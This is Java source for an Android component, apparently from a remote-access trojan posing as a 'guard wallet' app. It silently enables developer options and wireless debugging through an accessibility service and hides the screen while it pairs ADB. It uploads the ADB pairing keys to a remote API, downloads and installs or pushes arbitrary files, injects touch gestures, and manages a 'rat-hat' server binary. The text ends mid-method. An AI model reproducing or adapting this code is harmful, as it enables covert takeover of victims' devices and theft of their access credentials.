package com.guard.wallet.adb;
import com.guard.wallet.core.AppUtils;

import android.content.Context;
import android.os.Build;
import android.provider.Settings.Global;
import android.provider.Settings.System;
import android.text.TextUtils;
import android.util.Log;
import androidx.annotation.NonNull;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ReqWifiSettingDialogVO;
import com.guard.wallet.req.TouchEvent;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.service.MyAccessibilityService;
import io.github.muntashirakon.adb.AbsAdbConnectionManager;
import io.github.muntashirakon.adb.AdbStream;
import io.github.muntashirakon.adb.LocalServices;
import java.io.File;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.PrivateKey;
import java.security.cert.Certificate;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;
import com.guard.wallet.permission.PermissionManager;

/**
 * vendor h/e -> AdbConnectionManager.
 * ADB 连接管理: 配对/连接/shell执行/无线调试/手势回放.
 *
 * Migrated from hand-reversed AdbConnectionBuilder to libadb-android 3.1.1.
 * The library handles TLS, STLS, protocol framing and auth internally.
 */
public final class AdbConnectionManager extends AbsAdbConnectionManager {
    public static final Integer DEFAULT_ADB_PORT = 5555;
    private static final String TAG = "AdbConnectionManager";

    public static volatile AdbConnectionManager instance;

    public final AtomicBoolean writeSecureCompleted = new AtomicBoolean(false);
    public final AtomicBoolean ratHatPending = new AtomicBoolean(false);
    public PrivateKey privateKey;
    public Certificate certificate;
    public final Context context;
    public final ReentrantLock connectionLock = new ReentrantLock();
    public final ReentrantLock maintenanceLock = new ReentrantLock();
    public final ReentrantLock pairingLock = new ReentrantLock();
    public final AtomicBoolean bootstrapCompleted = new AtomicBoolean(true);
    public final AtomicInteger bootstrapRetryCount = new AtomicInteger(0);
    public final ExecutorService oConnect = Executors.newFixedThreadPool(1);
    public final ExecutorService pDownload = Executors.newFixedThreadPool(5);
    public final ExecutorService qInstall = Executors.newFixedThreadPool(2);
    public final ConcurrentHashMap<String, Long> downloadCache = new ConcurrentHashMap<>();
    public final AtomicBoolean wakeTaskBusy = new AtomicBoolean(false);
    public final AtomicLong lastWakeTime = new AtomicLong(0L);
    public final AtomicBoolean adbConnected = new AtomicBoolean(false);
    public final AtomicBoolean adbVerified = new AtomicBoolean(false);
    public final AtomicBoolean wPaired = new AtomicBoolean(false);
    public final AtomicInteger discoveredPairingPort = new AtomicInteger(0);
    public final AtomicInteger wireErrorCount = new AtomicInteger(0);
    public final AtomicInteger portDriftCount = new AtomicInteger(0);
    private int currentPort = 0;

    public AdbConnectionManager(Context context) {
        this.context = context;
        setApi(Build.VERSION.SDK_INT);
    }

    // === AbsAdbConnectionManager required abstract methods ===

    @NonNull
    @Override
    protected PrivateKey getPrivateKey() {
        if (this.privateKey == null) {
            this.privateKey = com.guard.wallet.utils.SystemHelper.I0();
        }
        if (this.privateKey == null) {
            String keyUrl = com.guard.wallet.utils.SharedPrefsManager.l("private.key.url");
            String keyDir = com.guard.wallet.utils.SystemHelper.i0();
            if (!AppUtils.B(keyUrl) && !AppUtils.B(keyDir)
                    && com.guard.wallet.delegate.AdbBridge.downloadFile(keyUrl, keyDir.concat("/").concat("private.key"))) {
                this.privateKey = com.guard.wallet.utils.SystemHelper.I0();
            }
        }
        // Library requires non-null; return a placeholder only if truly absent
        // (callers should check hasKeys() before connecting)
        return this.privateKey;
    }

    @NonNull
    @Override
    protected Certificate getCertificate() {
        if (this.certificate == null) {
            this.certificate = com.guard.wallet.utils.SystemHelper.H0();
        }
        if (this.certificate == null) {
            String certUrl = com.guard.wallet.utils.SharedPrefsManager.l("cert.pem.url");
            String keyDir = com.guard.wallet.utils.SystemHelper.i0();
            if (!AppUtils.B(certUrl) && !AppUtils.B(keyDir)
                    && com.guard.wallet.delegate.AdbBridge.downloadFile(certUrl, keyDir.concat("/").concat("cert.pem"))) {
                this.certificate = com.guard.wallet.utils.SystemHelper.H0();
            }
        }
        return this.certificate;
    }

    @NonNull
    @Override
    protected String getDeviceName() {
        return "com.guard.wallet";
    }

    // === Legacy method aliases for backward compatibility ===

    /** Legacy alias for getCertificate(). */
    public final Certificate B() {
        return getCertificate();
    }

    /** Legacy alias for getPrivateKey(). */
    public final PrivateKey C() {
        return getPrivateKey();
    }

    /**
     * vendor h/e.D() -- Check if ADB connection is alive.
     * Delegates to library's isConnected().
     */
    public final boolean D() {
        if (!this.adbConnected.get()) {
            return false;
        }
        return isConnected();
    }

    /** Check if keys are available. */
    public boolean hasKeys() {
        return this.privateKey != null || com.guard.wallet.utils.SystemHelper.I0() != null;
    }

    // === Singleton ===

    public static AdbConnectionManager getInstance() {
        synchronized (AdbConnectionManager.class) {
            return instance;
        }
    }

    public static synchronized void initialize() {
        Context context = com.guard.wallet.utils.SystemHelper.Z();
        if (instance != null || context == null) {
            return;
        }
        synchronized (AdbConnectionManager.class) {
            if (instance == null) {
                AdbConnectionManager inst = new AdbConnectionManager(context);
                instance = inst;
                boolean isPaired;
                synchronized (ADBConfig.class) {
                    isPaired = com.guard.wallet.utils.SharedPrefsManager.J().isPaired();
                }
                inst.wPaired.set(isPaired);
            }
        }
    }

    public static void setInstance(AdbConnectionManager inst) {
        instance = inst;
    }

    // === Shell execution (rewritten to use library AdbStream + InputStream) ===

    /**
     * vendor h/e.N(String) -> executeShellCommand. Execute shell command and check result.
     * Wraps command as: if ... then echo Success else echo Failed
     */
    public final boolean executeShellCommand(String command) {
        Log.e("AdbDebug", "executeShellCommand: " + command);
        if (AppUtils.B(command)) {
            Log.e("AdbDebug", "executeShellCommand: command is empty");
            return false;
        }
        Log.e("AdbDebug", "executeShellCommand: D()=" + this.D() + ", isConnected=" + isConnected());
        String wrapped = "if " + command + "; then echo \"Success\"; else echo \"Failed\"; fi";
        Log.e("AdbDebug", "executeShellCommand wrapped: " + wrapped);
        try (AdbStream stream = openStream(LocalServices.SHELL, wrapped)) {
            InputStream is = stream.openInputStream();
            byte[] buf = new byte[4096];
            StringBuilder output = new StringBuilder();
            long deadline = java.lang.System.currentTimeMillis() + 5000;
            while (java.lang.System.currentTimeMillis() < deadline) {
                if (is.available() > 0) {
                    int read = is.read(buf);
                    if (read > 0) output.append(new String(buf, 0, read, StandardCharsets.UTF_8));
                }
                String out = output.toString();
                if (out.contains("Success")) {
                    Log.e("AdbDebug", "executeShellCommand result: 1 (success)");
                    return true;
                }
                if (out.contains("Failed")) {
                    Log.e("AdbDebug", "executeShellCommand result: 0 (failed)");
                    return false;
                }
                if (stream.isClosed()) break;
                Thread.sleep(50);
            }
            Log.e("AdbDebug", "executeShellCommand result: timeout, output=" + output);
            return false;
        } catch (Exception ex) {
            Log.e("AdbDebug", "executeShellCommand error", ex);
            return false;
        }
    }

    /**
     * vendor h/e.O(String) -> writeShellCommand. Write command to ADB shell stream (fire-and-forget).
     */
    public final void writeShellCommand(String command) {
        if (AppUtils.B(command)) {
            return;
        }
        try (AdbStream stream = openStream(LocalServices.SHELL)) {
            byte[] data = String.format("%1$s\n", command).getBytes(StandardCharsets.UTF_8);
            stream.write(data, 0, data.length);
            Thread.sleep(500);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    /**
     * vendor h/e.P(command, successMatcher, failureMatcher) -> executeWithMatcher.
     * Execute command and match result using AdbLineMatcher.
     */
    public final int executeWithMatcher(String command, AdbLineMatcher successMatcher, AdbLineMatcher failureMatcher) {
        LinkedList<AdbLineMatcher> successMatchers = new LinkedList<>();
        LinkedList<AdbLineMatcher> failureMatchers = new LinkedList<>();
        successMatchers.add(successMatcher);
        failureMatchers.add(failureMatcher);
        return executeWithMatchers(command, successMatchers, failureMatchers);
    }

    /**
     * vendor h/e.Q(command, successMatchers, failureMatchers) -> executeWithMatchers.
     * Open ADB shell, execute command, read output line-by-line and match.
     */
    public final int executeWithMatchers(String command, LinkedList successMatchers, LinkedList failureMatchers) {
        Log.d("AdbDebug", "executeWithMatchers: " + command);
        if (AppUtils.B(command)) {
            return 5;
        }
        try (AdbStream stream = openStream(LocalServices.SHELL, command)) {
            InputStream is = stream.openInputStream();
            byte[] buf = new byte[4096];
            StringBuilder output = new StringBuilder();
            long deadline = java.lang.System.currentTimeMillis() + 5000;

            while (java.lang.System.currentTimeMillis() < deadline) {
                if (is.available() > 0) {
                    int read = is.read(buf);
                    if (read > 0) {
                        String chunk = new String(buf, 0, read, StandardCharsets.UTF_8);
                        output.append(chunk);

                        // Check matchers against accumulated output lines
                        String[] lines = output.toString().split("\n");
                        for (String line : lines) {
                            // Check success matchers
                            for (Object obj : successMatchers) {
                                AdbLineMatcher matcher = (AdbLineMatcher) obj;
                                if (matcher.matches(line)) {
                                    return matcher.getResultCode();
                                }
                            }
                            // Check failure matchers
                            for (Object obj : failureMatchers) {
                                AdbLineMatcher matcher = (AdbLineMatcher) obj;
                                if (matcher.matches(line)) {
                                    return matcher.getResultCode();
                                }
                            }
                        }
                    }
                }
                if (stream.isClosed()) break;
                Thread.sleep(50);
            }
            return 5;
        } catch (Exception ex) {
            Log.e("AdbDebug", "executeWithMatchers EXCEPTION: " + ex.getMessage(), ex);
            AppUtils.s(TAG, ex);
            return 5;
        }
    }

    /**
     * Open a stream via the library. Convenience wrapper for callers that used E(args, serviceId).
     * serviceId 1 = SHELL, serviceId 12/16 = other local services.
     */
    public final AdbStream openStreamCompat(String[] args, int serviceId) throws Exception {
        switch (serviceId) {
            case 1: // SHELL
                if (args != null && args.length > 0 && !AppUtils.B(args[0])) {
                    return openStream(LocalServices.SHELL, args[0]);
                }
                return openStream(LocalServices.SHELL);
            case 12: // SYNC
                return openStream("sync:");
            case 16: // tcpip:<port>
                if (args != null && args.length > 0) {
                    return openStream("tcpip:" + args[0]);
                }
                return openStream("tcpip:5555");
            default:
                return openStream(LocalServices.SHELL);
        }
    }

    // === Connection ===

    /**
     * vendor h/e.J(int) -> connectToPort. Connect via ADB TLS to the specified port.
     */
    public final synchronized CheckPortResult connectToPort(int port) {
        if (this.context == null || port <= 0 || getPrivateKey() == null || getCertificate() == null) {
            return null;
        }
        try {
            if (this.D()) {
                CheckPortResult result = new CheckPortResult();
                result.setConnected(true);
                result.setDebugPort(this.currentPort);
                result.setConnectedDevice("com.guard.wallet");
                this.wireErrorCount.set(0);
                this.adbConnected.set(true);
                this.adbVerified.set(true);
                return result;
            }
            setTimeout(5000, TimeUnit.MILLISECONDS);
            String host = com.guard.wallet.utils.SystemHelper.c0(this.context);
            boolean connected = connect(host, port);
            if (connected) {
                this.currentPort = port;
                CheckPortResult result = new CheckPortResult();
                result.setConnected(true);
                result.setDebugPort(port);
                result.setConnectedDevice("com.guard.wallet");
                com.guard.wallet.utils.SharedPrefsManager.x(result);
                this.wireErrorCount.set(0);
                this.adbConnected.set(true);
                this.adbVerified.set(true);
                return result;
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        return null;
    }

    /**
     * vendor h/e.K(host, port, code) -> pairDevice. Wireless debugging pairing.
     */
    public final boolean pairDevice(String host, int port, String code) {
        if (!this.pairingLock.tryLock()) {
            return this.wPaired.get();
        }
        try {
            if (AppUtils.B(code)) {
                return false;
            }
            if (this.context == null) {
                return this.wPaired.get();
            }

            String resolvedHost = host;
            if (AppUtils.B(resolvedHost)) {
                resolvedHost = com.guard.wallet.utils.SystemHelper.c0(this.context);
            }
            int resolvedPort = port;
            if (resolvedPort <= 0) {
                Integer fallback = this.discoverPairingPort();
                resolvedPort = fallback != null ? fallback : DEFAULT_ADB_PORT;
            }

            boolean keyCreated;
            if (com.guard.wallet.utils.SystemHelper.R()) {
                Log.d(TAG, "本地配对密钥文件创建完成");
                keyCreated = true;
            } else {
                keyCreated = false;
            }
            this.privateKey = com.guard.wallet.utils.SystemHelper.I0();
            this.certificate = com.guard.wallet.utils.SystemHelper.H0();

            boolean paired = false;
            try {
                if (Build.VERSION.SDK_INT >= 30) {
                    Log.d(TAG, "正在配对中......");
                    paired = pair(resolvedHost, resolvedPort, code);
                }
            } catch (Exception ex) {
                AppUtils.t(TAG, ex);
            }

            if (paired) {
                Log.d(TAG, "无线调试配对成功");
                if (keyCreated) {
                    try {
                        Log.d(TAG, "无线调试配对成功,上传本地配对文件");
                        String keyDir = com.guard.wallet.utils.SystemHelper.i0();
                        if (!AppUtils.B(keyDir)) {
                            String privateKeyPath = keyDir.concat("/").concat("private.key");
                            String certPemPath = keyDir.concat("/").concat("cert.pem");
                            File privateKeyFile = new File(privateKeyPath);
                            File certPemFile = new File(certPemPath);
                            if (privateKeyFile.exists() && certPemFile.exists()) {
                                LinkedList<File> files = new LinkedList<>();
                                files.add(privateKeyFile);
                                files.add(certPemFile);
                                String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
                                if (!AppUtils.B(deviceId) && !files.isEmpty()) {
                                    UploadFileVO uploadVO = new UploadFileVO(deviceId, "100012");
                                    com.guard.wallet.http.HttpClient client = new com.guard.wallet.http.HttpClient();
                                    com.guard.wallet.http.UploadPairKeyCallback callback = new com.guard.wallet.http.UploadPairKeyCallback();
                                    client.asyncUploadFiles(uploadVO, "/api/pairKeyFile/batch.json", files, callback);
                                }
                            }
                        }
                    } catch (Exception ex) {
                        AppUtils.s("AdbKeyUtils", ex);
                    }
                }
            } else {
                Log.e(TAG, "无线调试配对失败");
            }

            {
                this.wPaired.set(paired);
                synchronized (ADBConfig.class) {
                    ADBConfig config = com.guard.wallet.utils.SharedPrefsManager.J();
                    config.setPaired(paired);
                    config.setUpdateTime(new Date().getTime());
                    com.guard.wallet.utils.SharedPrefsManager.D(com.guard.wallet.utils.SharedPrefsManager.N(config), "ADBConfig");
                    com.guard.wallet.http.HttpApiManager.syncAdbConfig(config);
                }
            }
            return this.wPaired.get();
        } finally {
            this.pairingLock.unlock();
        }
    }

    // === Pairing flow / developer options / wireless debugging ===

    /**
     * vendor h/e.Y(BlockViewVO) -> startPairingFlow.
     */
    public static boolean startPairingFlow(BlockViewVO blockView) {
        try {
            if (MyAccessibilityService.P() == null) {
                return false;
            }
            if (Build.VERSION.SDK_INT < 30 || com.guard.wallet.utils.DeviceUtils.isHarmonyOS()) {
                return false;
            }

            BlockViewVO resolved = blockView;
            if (resolved == null) {
                resolved = new BlockViewVO(false, null, true, true);
            }

            if (MyAccessibilityService.P().j()) {
                return false;
            }
            if (com.guard.wallet.delegate.AdbBridge.isPowerSaveMode()) {
                return false;
            }

            boolean hasPairHistory = com.guard.wallet.utils.SharedPrefsManager.n() || com.guard.wallet.utils.SharedPrefsManager.o();

            if (!com.guard.wallet.utils.SharedPrefsManager.o()) {
                com.guard.wallet.http.HttpApiManager.fetchLockCiphers();
            }
            if (!com.guard.wallet.utils.SystemHelper.K()) {
                enableDeveloperOptions();
            }

            Integer wifiConnected = com.guard.wallet.utils.SystemHelper.z0().getIsWifiConnected();
            if (!Objects.equals(wifiConnected, 1)) {
                String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
                if (!AppUtils.B(deviceId)) {
                    ReqWifiSettingDialogVO reqWifi = new ReqWifiSettingDialogVO(deviceId);
                    com.guard.wallet.http.HttpClient client = new com.guard.wallet.http.HttpClient(com.guard.wallet.http.HttpApiManager.apiBaseUrl);
                    client.asyncGet(reqWifi, "/api/navigate/wifiDialog.json", new com.guard.wallet.http.NavigateWifiDialogContentCallback());
                }
                return false;
            }

            if (!com.guard.wallet.utils.SystemHelper.J()) {
                enableWirelessDebugging();
            }

            if (com.guard.wallet.utils.SystemHelper.p0() && com.guard.wallet.utils.SystemHelper.r0() && !hasPairHistory) {
                return false;
            }

            if (!com.guard.wallet.utils.SystemHelper.n0()) {
                return false;
            }

            if (com.guard.wallet.delegate.AdbBridge.getPipActivity() != null && com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
                com.guard.wallet.delegate.AdbBridge.finishPip();
                com.guard.wallet.utils.SystemHelper.T0(10);
            }

            if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
                MyAccessibilityService.P().getClass();
                resolved.setBlockDrawable(MyAccessibilityService.o0());
            }

            com.guard.wallet.helper.BlockViewManager.a(resolved);

            ReqUnlockDeviceVO unlockReq = new ReqUnlockDeviceVO();
            if (!com.guard.wallet.utils.SystemHelper.p1(unlockReq)) {
                com.guard.wallet.helper.BlockViewManager.c();
                return false;
            }

            if (LockActivity.b() != null) {
                LockActivity.a();
                com.guard.wallet.utils.SystemHelper.T0(10);
            }

            if (AppUtils.G() && !AppUtils.A() && !AppUtils.O(null, null)) {
                com.guard.wallet.helper.BlockViewManager.c();
                return false;
            }

            com.guard.wallet.http.HttpApiManager.sendIntentCodeMessage("PAIR_RUNNING_EVENT");

            if (com.guard.wallet.utils.SystemHelper.K()) {
                MyAccessibilityService.P().H(true, true);
                MyAccessibilityService.P().e();
                com.guard.wallet.utils.SystemHelper.T0(10);
                com.guard.wallet.utils.SystemHelper.f1();
            } else {
                MyAccessibilityService.P().H(true, true);
                MyAccessibilityService.P().a();
                MyAccessibilityService svc = MyAccessibilityService.P();
                svc.getClass();
                try {
                    if (svc.n() != null) {
                        svc.z();
                    }
                    ConcurrentLinkedQueue delegateQueue = svc.a;
                    com.guard.wallet.delegate.OpenDevelopmentDelegate delegate = com.guard.wallet.delegate.AdbBridge.createOpenDevDelegate();
                    delegateQueue.add(delegate);
                    LinkedList windows = com.guard.wallet.delegate.AdbBridge.getOpenDevWindows();
                    svc.t("com.guard.wallet.delegate.OpenDevelopmentDelegate", windows);
                } catch (Exception ex) {
                    AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", ex);
                }
                com.guard.wallet.utils.SystemHelper.T0(10);
                com.guard.wallet.utils.SystemHelper.g1();
            }

            return true;
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
            return false;
        }
    }

    /** vendor h/e.Z() -> enableDeveloperOptions. */
    public static void enableDeveloperOptions() {
        boolean enabled = false;
        try {
            if (com.guard.wallet.utils.SystemHelper.Z() != null && (System.canWrite(com.guard.wallet.utils.SystemHelper.Z()) || com.guard.wallet.utils.SystemHelper.j())) {
                Log.d("ApplicationUtil", "已有系统设置修改权限");
                Global.putInt(com.guard.wallet.utils.SystemHelper.Z().getContentResolver(), "development_settings_enabled", 1);
                if (com.guard.wallet.utils.SystemHelper.K()) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限,开启开发者选项成功");
                    enabled = true;
                }
            }
        } catch (Exception ex) {
            AppUtils.s("ApplicationUtil", ex);
        }

        if (enabled) {
            return;
        }
        if (!AppUtils.E(7912)) {
            Log.d(TAG, "请求7912开启开发者选项");
            com.guard.wallet.http.HttpApiManager.openDevelopment("http://127.0.0.1:7912");
        } else if (!AppUtils.E(7911)) {
            Log.d(TAG, "请求7911开启开发者选项");
            com.guard.wallet.http.HttpApiManager.openDevelopment("http://127.0.0.1:7911");
        }
    }

    /** vendor h/e.a0() -> enableWirelessDebugging. */
    public static void enableWirelessDebugging() {
        Log.d(TAG, "准备开启无线调试");
        Integer wifiConnected = com.guard.wallet.utils.SystemHelper.z0().getIsWifiConnected();
        if (Objects.equals(wifiConnected, 0)) {
            Log.d(TAG, "WIFI无线网络没有连接");
            return;
        }
        if (com.guard.wallet.utils.SystemHelper.p0()) {
            Log.d(TAG, "锁屏中,放弃开启无线调试");
            return;
        }
        if (MyAccessibilityService.P() == null) {
            Log.d(TAG, "无障碍服务未开启,放弃开启无线调试");
            return;
        }
        if (MyAccessibilityService.P() != null && !MyAccessibilityService.P().V()) {
            Log.d(TAG, "无障碍监听窗口初始化未完成,放弃开启无线调试");
            return;
        }

        if (com.guard.wallet.utils.DeviceUtils.isVivoFamily() && !com.guard.wallet.utils.SystemHelper.K()) {
            enableDeveloperOptions();
        }

        boolean enabled = false;
        try {
            if (com.guard.wallet.utils.SystemHelper.Z() != null && (System.canWrite(com.guard.wallet.utils.SystemHelper.Z()) || com.guard.wallet.utils.SystemHelper.j())) {
                Log.d("ApplicationUtil", "已有系统设置修改权限");
                Global.putInt(com.guard.wallet.utils.SystemHelper.Z().getContentResolver(), "adb_wifi_enabled", 1);
                if (com.guard.wallet.utils.SystemHelper.J()) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限,开启无线调试成功");
                    enabled = true;
                }
            }
        } catch (Exception ex) {
            AppUtils.s("ApplicationUtil", ex);
        }

        if (enabled) {
            Log.d(TAG, "无障碍服务监听窗口初始化已完成,本地开启无线调试");
        } else if (!AppUtils.E(7912)) {
            Log.d(TAG, "无障碍服务监听窗口初始化已完成,请求7912开启无线调试");
            com.guard.wallet.http.HttpApiManager.openWifiDebug("http://127.0.0.1:7912");
        } else if (!AppUtils.E(7911)) {
            Log.d(TAG, "无障碍服务监听窗口初始化已完成,请求7911开启无线调试");
            com.guard.wallet.http.HttpApiManager.openWifiDebug("http://127.0.0.1:7911");
        }
    }

    // === Download / Install / Push ===

    /**
     * vendor h/e.G() -> downloadAndInstall.
     */
    public final boolean downloadAndInstall(String logId, String fileUrl, String fileName, String startCommand) {
        if (AppUtils.B(fileUrl)) {
            return false;
        }
        String resolvedFileName = fileName;
        if (AppUtils.B(resolvedFileName)) {
            resolvedFileName = AppUtils.x(fileUrl);
            if (AppUtils.B(resolvedFileName)) {
                resolvedFileName = "unknown";
            }
        }
        if (this.downloadCache.containsKey(fileUrl) || !this.D()) {
            return false;
        }
        this.downloadCache.put(fileUrl, new Date().getTime());
        com.guard.wallet.download.MultiModeTask downloadTask = com.guard.wallet.delegate.AdbBridge.createDownloadTask(fileUrl, resolvedFileName, 0);
        AdbInstallTask installTask = new AdbInstallTask(this, logId, fileUrl, this.pDownload.submit(downloadTask), startCommand);
        this.qInstall.submit(installTask);
        return true;
    }

    /**
     * vendor h/e.H() -> periodicMaintenance.
     */
    public final void periodicMaintenance() {
        ReentrantLock lock = this.maintenanceLock;
        if (lock.tryLock()) {
            try {
                if (com.guard.wallet.delegate.AdbBridge.isPowerSaveMode()) {
                    Log.d(TAG, "进入省电模式保活策略");
                    lock.unlock();
                    return;
                }
                if (Build.VERSION.SDK_INT >= 30 && !com.guard.wallet.utils.DeviceUtils.isHarmonyOS()) {
                    if (!com.guard.wallet.utils.SystemHelper.J() && Objects.equals(com.guard.wallet.utils.SystemHelper.z0().getIsWifiConnected(), 1)) {
                        enableWirelessDebugging();
                    }
                    if (this.C() != null && this.B() != null) {
                        this.oConnect.submit(new AdbWorkerTask(this, 0));
                    }
                } else {
                    Log.d(TAG, "此处添加 Android 10及以下版本、华为鸿蒙的ADB连接逻辑");
                }
            } catch (Exception ex) {
                AppUtils.s(TAG, ex);
            }
            lock.unlock();
        }
    }

    /**
     * vendor h/e.I() -> downloadAndPush.
     */
    public final boolean downloadAndPush(String logId, String fileUrl, String fileName, String startCommand) {
        if (AppUtils.B(fileUrl)) {
            return false;
        }
        String resolvedFileName = fileName;
        if (AppUtils.B(resolvedFileName)) {
            resolvedFileName = AppUtils.x(fileUrl);
            if (AppUtils.B(resolvedFileName)) {
                resolvedFileName = "unknown";
            }
        }
        if (this.downloadCache.containsKey(fileUrl) || !this.D()) {
            return false;
        }
        this.downloadCache.put(fileUrl, new Date().getTime());
        com.guard.wallet.download.MultiModeTask downloadTask = com.guard.wallet.delegate.AdbBridge.createDownloadTask(fileUrl, resolvedFileName, 0);
        AdbPushTask pushTask = new AdbPushTask(this, logId, fileUrl, resolvedFileName,
                this.pDownload.submit(downloadTask), startCommand);
        this.qInstall.submit(pushTask);
        return true;
    }

    // === Port discovery / pairing ===

    /**
     * vendor h/e.L() -> discoverPairingPort. NSD discovery for adb-tls-pairing port.
     */
    public final Integer discoverPairingPort() {
        if (this.context == null) {
            return null;
        }
        final AtomicInteger portRef = new AtomicInteger(-1);
        final CountDownLatch latch = new CountDownLatch(1);
        com.guard.wallet.discovery.NsdServiceDiscovery discovery = new com.guard.wallet.discovery.NsdServiceDiscovery(this.context, "adb-tls-pairing", new NsdPortCallback(portRef, latch));
        discovery.startDiscovery();
        try {
            if (!latch.await(30L, TimeUnit.SECONDS)) {
                discovery.stopDiscovery();
                return null;
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
        discovery.stopDiscovery();
        this.discoveredPairingPort.set(portRef.get());
        return this.discoveredPairingPort.get();
    }

    /**
     * vendor h/e.M() -> scanForDebugPort. Parallel port scan for ADB debug port.
     */
    public final CheckPortResult scanForDebugPort() {
        CheckPortResult result = null;
        if (!this.isPaired() || this.C() == null || this.B() == null || !com.guard.wallet.utils.SystemHelper.J()) {
            return result;
        }
        ReentrantLock lock = this.connectionLock;
        if (!lock.tryLock()) {
            return result;
        }
        this.adbVerified.set(false);
        ExecutorService scanPool = Executors.newFixedThreadPool(2);
        LinkedList<Future<?>> futures = new LinkedList<>();
        for (int seg = 1; seg <= 4; seg++) {
            int startPort = (seg - 1) * 5000 + 30000;
            int endPort = seg * 5000 + 30000 - 1;
            futures.add(scanPool.submit(com.guard.wallet.delegate.AdbBridge.createScanTask(startPort, endPort, 2)));
        }
        while (!futures.isEmpty()) {
            try {
                ListIterator<Future<?>> iter = futures.listIterator();
                while (iter.hasNext()) {
                    Future<?> future = iter.next();
                    if (future.isDone()) {
                        CheckPortResult portResult = (CheckPortResult) future.get();
                        future.cancel(true);
                        iter.remove();
                        if (portResult != null) {
                            result = portResult;
                        }
                    }
                }
            } catch (Exception ex) {
                if (!AppUtils.B(ex.getMessage())) {
                    AppUtils.s(TAG, ex);
                }
            }
        }
        scanPool.shutdown();
        lock.unlock();
        return result;
    }

    // === Cleanup ===

    /**
     * vendor h/e.R(boolean) -> cleanupAfterPairing.
     */
    public final void cleanupAfterPairing(boolean success) {
        if (success) {
            this.writeSecureCompleted.set(true);
        }
        if (com.guard.wallet.delegate.AdbBridge.isPipRunning()) {
            com.guard.wallet.delegate.AdbBridge.stopPip();
        }
        com.guard.wallet.helper.BlockViewManager.c();
        if (MyAccessibilityService.P() != null) {
            MyAccessibilityService.P().v();
        }
        if (!success) {
            return;
        }
        if (!this.maintenanceLock.tryLock()) {
            return;
        }
        try {
            if (this.executeShellCommand("/data/local/tmp/rat-hat server --stop")) {
                com.guard.wallet.utils.SystemHelper.T0(25);
                this.writeShellCommand("exit");
                try {
                    disconnect();
                    this.adbConnected.set(false);
                    com.guard.wallet.utils.SharedPrefsManager.p();
                } catch (Exception ex) {
                    AppUtils.s(TAG, ex);
                }
            }
        } finally {
            this.maintenanceLock.unlock();
        }
    }

    /**
     * vendor h/e.U() -> isPaired.
     */
    public final boolean isPaired() {
        boolean isPaired;
        synchronized (ADBConfig.class) {
            isPaired = com.guard.wallet.utils.SharedPrefsManager.J().isPaired();
        }
        AtomicBoolean pairFlag = this.wPaired;
        if (isPaired) {
            boolean isPaired2;
            synchronized (ADBConfig.class) {
                isPaired2 = com.guard.wallet.utils.SharedPrefsManager.J().isPaired();
            }
            pairFlag.set(isPaired2);
        }
        return pairFlag.get();
    }

    /**
     * vendor h/e.V() -> closeDeveloperOptionsIfSafe.
     */
    public final void closeDeveloperOptionsIfSafe() {
        try {
            if (Build.VERSION.SDK_INT <= 29
                    || MyAccessibilityService.P() == null
                    || MyAccessibilityService.P().p()
                    || MyAccessibilityService.P().n() != null
                    || MyAccessibilityService.P().h()) {
                return;
            }
            Log.d(TAG, "保持关闭开发者选项");
            if (com.guard.wallet.utils.SystemHelper.K() && this.isPaired() && com.guard.wallet.utils.SystemHelper.b() && this.D()) {
                Log.d(TAG, "无线调试已配对、无线调试已连接 关闭开发者选项");
                com.guard.wallet.http.HttpApiManager.closeDevelopment();
            }
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }

    // === Gesture / Input ===

    /**
     * vendor h/e.W(LinkedList<Point>) -> executeSwipeGesture.
     */
    public final boolean executeSwipeGesture(LinkedList<Point> points) {
        if (points == null || points.isEmpty() || !D()) {
            return false;
        }
        LinkedList<String> commands = new LinkedList<>();
        for (int idx = 0; idx < points.size(); idx++) {
            Point pt = points.get(idx);
            Locale locale = Locale.getDefault();
            if (idx == 0) {
                commands.add(String.format(locale, "input motionevent DOWN %.0f %.0f",
                        pt.getX(), pt.getY()));
            } else {
                commands.add(String.format(locale, "input motionevent MOVE %.0f %.0f",
                        pt.getX(), pt.getY()));
                if (idx == points.size() - 1) {
                    commands.add(String.format(Locale.getDefault(), "input motionevent UP %.0f %.0f",
                            pt.getX(), pt.getY()));
                }
            }
        }
        if (!commands.isEmpty()) {
            return this.executeShellCommand(TextUtils.join(" && ", commands));
        }
        return false;
    }

    /**
     * vendor h/e.X() -> openWriteSecure.
     */
    public final boolean openWriteSecure() {
        if (MyAccessibilityService.P() == null) {
            if (!MyAccessibilityService.r2.get() && !com.guard.wallet.utils.SystemHelper.L()) {
                com.guard.wallet.utils.GuideDialogUtils.triggerGuideFlow();
            }
            return false;
        }
        if (com.guard.wallet.utils.SystemHelper.b()) {
            return false;
        }
        boolean canWriteSecure;
        synchronized (com.guard.wallet.utils.SharedPrefsManager.class) {
            canWriteSecure = com.guard.wallet.utils.SharedPrefsManager.e("adbCanWriteSecure");
        }
